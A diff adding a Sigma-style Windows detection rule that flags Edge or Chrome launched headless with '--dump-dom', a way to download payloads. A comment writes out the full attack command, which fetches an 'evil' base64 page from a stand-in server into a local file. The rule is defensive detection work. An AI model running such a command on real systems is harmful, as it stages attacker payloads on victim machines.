@@ -1,0 +1,27 @@
+title: Edge/Chrome headless feature abuse for payload download
+description: Detects scenarios where an attacker executes Chrome in headless mode in order to download a payload. Document Object Model (DOM) may also be abused to download obfuscated data from attacker repositary.
+references:
+- https://twitter.com/mrd0x/status/1478234484881436672?t=oVqHbDQx9fsc6yWmNTV3eA&s=09
+- https://developers.google.com/web/updates/2017/04/headless-chrome
+- https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model
+tags:
+- attack.execution
+- attack.t1204
+author: mdecrevoisier
+status: experimental
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection: # full command: '[msedge.exe | chrome.exe] --headless --enable-logging --disable-gpu --dump-dom "http://server/evil.b64.html" > out.b64'
+    EventID: 4688
+    NewProcessName|endswith:
+      - \msedge.exe
+      - \chrome.exe
+    CommandLine|contains|all:
+      - '--dump-dom'
+      - '--headless'
+  condition: selection
+falsepositives:
+- None
+level: high
